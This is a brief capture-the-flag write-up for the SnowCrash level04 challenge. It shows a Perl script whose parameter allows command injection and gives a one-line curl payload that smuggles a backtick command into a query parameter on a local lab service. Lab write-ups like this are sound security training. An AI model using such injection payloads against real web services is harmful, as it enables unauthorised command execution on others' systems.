# Find the password of Flag04

## First check :
Home directory : \[✓\] not empty.

```
$ ls
$ level04.pl
```
## Deeper check :

`cat level04.pl`

In the perl file, we noticed that there is a possibility to inject a command in the param.

> curl 'localhost:4747?x=\`getflag\`'

## TADAAAAAAA, It's ... 
[The next level flag](https://github.com/XD-OB/snowcrash/blob/master/level04/flag)

_tobecontinued_